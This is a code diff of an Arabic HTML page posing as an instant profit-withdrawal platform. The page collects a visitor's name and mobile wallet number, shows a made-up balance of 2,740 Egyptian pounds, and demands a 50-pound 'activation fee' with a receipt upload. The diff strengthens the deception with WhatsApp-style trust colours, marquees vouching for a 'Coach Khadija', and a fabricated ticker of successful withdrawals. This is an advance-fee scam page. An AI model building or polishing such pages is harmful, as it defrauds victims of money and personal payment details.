@@ -3,123 +3,171 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>نظام سحب الأرباح</title>
+<title>منصة الأرباح المعتمدة</title>
 <style>
-body{
-    font-family: Tahoma, Arial;
-    background:#f2f2f2;
-    margin: 0;
-    padding: 0;
-    text-align:center;
-}
-/* شريط المعلومات العلوي (يظهر بعد إدخال البيانات) */
-#header-info {
-    background: #fff;
-    padding: 10px 20px;
-    border-bottom: 2px solid #ddd;
-    text-align: right;
-    font-size: 14px;
-    color: #333;
-    display: none; /* مخفي في البداية */
-}
-#header-info span {
-    font-weight: bold;
-    color: #c40000;
-}
+    :root {
+        --primary-color: #25d366; /* لون واتساب أخضر للثقة */
+        --secondary-color: #ffd400; /* أصفر للتميز */
+        --danger-color: #ff4d4d;
+    }
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: #eef2f5;
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+    }
 
-.box{
-    background:#fff;
-    width:90%;
-    max-width:500px;
-    margin:40px auto;
-    padding:20px;
-    border-radius:12px;
-    box-shadow:0 0 10px rgba(0,0,0,0.1);
-}
-.title{
-    color:#c40000;
-    font-weight:bold;
-    font-size:22px;
-    margin-bottom: 15px;
-}
-input[type="text"], input[type="number"] {
-    width: 90%;
-    padding: 12px;
-    margin: 10px 0;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-}
-button{
-    background:#ffd400;
-    border:none;
-    padding:15px;
-    width:100%;
-    border-radius:8px;
-    font-size:18px;
-    cursor: pointer;
-    font-weight: bold;
-    margin-top: 10px;
-}
-#payment-section {
-    display: none; /* مخفي في البداية */
-}
+    /* الشريط العلوي */
+    .top-bar {
+        background: #fff;
+        padding: 15px;
+        border-bottom: 3px solid var(--primary-color);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    .user-meta { text-align: right; display: none; }
+    .user-meta span { color: var(--primary-color); font-weight: bold; }
+
+    /* الأشرطة الجانبية المتحركة */
+    .side-text {
+        position: fixed;
+        top: 50%;
+        transform: translateY(-50%);
+        background: var(--primary-color);
+        color: white;
+        padding: 10px;
+        font-weight: bold;
+        writing-mode: vertical-rl;
+        font-size: 14px;
+        z-index: 100;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    .right-side { right: 0; }
+    .left-side { left: 0; background: #c40000; }
+
+    /* الحاوية الرئيسية */
+    .main-container {
+        max-width: 500px;
+        margin: 40px auto;
+        background: #fff;
+        border-radius: 20px;
+        overflow: hidden;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    }
+    .banner {
+        background: linear-gradient(45deg, #25d366, #128c7e);
+        color: white;
+        padding: 20px;
+        font-size: 20px;
+        font-weight: bold;
+    }
+    .content { padding: 30px; }
+
+    input {
+        width: 100%;
+        padding: 15px;
+        margin: 10px 0;
+        border: 2px solid #eee;
+        border-radius: 10px;
+        box-sizing: border-box;
+        outline: none;
+        transition: 0.3s;
+    }
+    input:focus { border-color: var(--primary-color); }
+
+    button {
+        background: var(--secondary-color);
+        color: #000;
+        border: none;
+        padding: 15px;
+        width: 100%;
+        border-radius: 10px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+        box-shadow: 0 4px 0 #d4b000;
+    }
+    button:active { transform: translateY(2px); box-shadow: none; }
+
+    /* نصوص متحركة أسفل الصفحة */
+    .scrolling-footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background: #333;
+        color: #fff;
+        padding: 5px 0;
+    }
 </style>
 </head>
 <body>
 
-<div id="header-info">
-    <div>الاسم: <span id="display-name"></span></div>
-    <div>رقم المحفظة: <span id="display-phone"></span></div>
+<div class="side-text right-side">
+    <marquee direction="up" scrollamount="3">كوتش خديجة ثقة تعامل مية مية</marquee>
+</div>
+<div class="side-text left-side">
+    <marquee direction="down" scrollamount="3">ربنا يزيدها ويبارك لها يارب</marquee>
 </div>
 
-<div class="box">
+<div class="top-bar">
+    <div id="user-info" class="user-meta">
+        <div>مرحباً: <span id="name-tag"></span></div>
+        <div>محفظة: <span id="phone-tag"></span></div>
+    </div>
+    <div style="font-weight: bold; color: #128c7e;">⭐ نظام السحب الفوري</div>
+</div>
+
+<div class="main-container">
+    <div class="banner">لوحة تحكم الأرباح</div>
     
-    <div id="login-section">
-        <div class="title">تسجيل دخول للسحب</div>
-        <p>أدخل بيانات محفظتك لتلقي الأرباح</p>
-        <input type="text" id="user-name" placeholder="أدخل اسمك الكامل">
-        <input type="number" id="user-phone" placeholder="أدخل رقم المحفظة (فودافون كاش مثلاً)">
-        <button onclick="showPayment()">دخول</button>
+    <div class="content" id="step-1">
+        <h3>تسجيل بيانات المستلم</h3>
+        <input type="text" id="in-name" placeholder="أدخل اسمك كما هو في المحفظة">
+        <input type="number" id="in-phone" placeholder="أدخل رقم المحفظة">
+        <button onclick="nextStep()">دخول لنظام السحب</button>
     </div>
 
-    <div id="payment-section">
-        <div class="title">تأكيد سحب الأرباح</div>
-        <p>رصيدك الحالي: <b>2740 جنيه مصري</b></p>
-        <p style="color: red; font-size: 14px;">يجب دفع رسوم إدارية (50 جنيه) لتفعيل السحب</p>
-        <p>أرفق صورة التحويل هنا:</p>
-        <input type="file" id="img" accept="image/*">
-        <button onclick="goNext()">تأكيد وإرسال</button>
+    <div class="content" id="step-2" style="display: none;">
+        <h2 style="color: var(--primary-color);">تم تأكيد استحقاقك!</h2>
+        <p style="font-size: 18px;">رصيدك القابل للسحب: <b>2,740 ج.م</b></p>
+        <hr>
+        <p style="font-size: 14px; color: #666;">يرجى تحويل رسوم التفعيل (50 ج.م) وأرفق الإيصال:</p>
+        <input type="file" id="file-up">
+        <button onclick="finish()">تأكيد عملية السحب</button>
     </div>
+</div>
 
+<div class="scrolling-footer">
+    <marquee>آخر عمليات السحب الناجحة: أحمد م. (3500ج) - سارة ع. (1200ج) - محمود ك. (5000ج) - كوتش خديجة تضمن لكم الأمان التام</marquee>
 </div>
 
 <script>
-function showPayment() {
-    var name = document.getElementById('user-name').value;
-    var phone = document.getElementById('user-phone').value;
-
-    if(name === "" || phone === "") {
-        alert("من فضلك أدخل الاسم ورقم المحفظة أولاً");
-    } else {
-        // عرض البيانات في الشريط العلوي
-        document.getElementById('display-name').innerText = name;
-        document.getElementById('display-phone').innerText = phone;
-        
-        // التبديل بين الأقسام
-        document.getElementById('login-section').style.display = 'none';
-        document.getElementById('header-info').style.display = 'block';
-        document.getElementById('payment-section').style.display = 'block';
+    function nextStep() {
+        const name = document.getElementById('in-name').value;
+        const phone = document.getElementById('in-phone').value;
+        if(name && phone) {
+            document.getElementById('name-tag').innerText = name;
+            document.getElementById('phone-tag').innerText = phone;
+            document.getElementById('user-info').style.display = 'block';
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+        } else {
+            alert("برجاء إكمال البيانات");
+        }
     }
-}
 
-function goNext() {
-    var file = document.getElementById('img').value;
-    if(file === "") {
-        alert("من فضلك أرفق صورة التحويل");
-    } else {
-        window.location.href = "success.html";
+    function finish() {
+        if(document.getElementById('file-up').value) {
+            window.location.href = "success.html";
+        } else {
+            alert("برجاء رفع صورة التحويل");
+        }
     }
-}
 </script>
 
 </body>
